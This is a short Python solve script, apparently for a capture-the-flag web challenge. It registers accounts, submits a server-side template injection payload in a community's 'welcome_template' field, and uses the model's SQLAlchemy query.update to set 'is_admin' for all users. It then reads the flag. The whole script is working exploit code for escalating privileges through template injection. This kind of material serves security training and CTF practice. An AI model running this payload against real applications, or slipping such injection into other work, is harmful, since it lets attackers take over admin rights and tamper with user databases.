import sys
import requests
import secrets
import re


url = sys.argv[1]

session = requests.Session()

def login(username, password):
    r = session.post(f"{url}/login", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
        'password': password,
    })
    assert r.status_code == 200
    return r

def register(username, password):
    r = session.post(f"{url}/register", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
        'password': password,
    })
    assert r.status_code == 200
    return r


def create_community(name, welcome_template) -> int:
    r = session.post(f"{url}/create", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'name': name,
        'welcome_template': welcome_template,
    })
    assert r.status_code == 200
    
    # extract the community ID
    html = r.text
    pattern = r'<a href="\/community\/(?P<id>\d+)">'
    pattern += re.escape(name)
    pattern += r"<\/a>"
    match = re.search(pattern, html)

    return int(match.group('id'))

def join_community(id: int):
    r = session.post(f"{url}/join/{id}")
    assert r.status_code == 200
    return r

def read_flag():
    r = session.get(f"{url}/flag")
    print("Flag:", r.text)

# use a random username every time, this is that you can run the solve script multiple times
# without conflict.
username = secrets.token_hex(20)
password = secrets.token_hex(20)

register(username, password)
login(username, password)
# the template variable `user` is not a simple python dict, it's an SQLAlchmeny model, so .query.update is available
id = create_community(secrets.token_hex(10), welcome_template="{{user.query.update({'is_admin': 1})}}")

session.cookies.clear()

register(username + '_second_account', password)
login(username + '_second_account', password)

join_community(id)
read_flag()
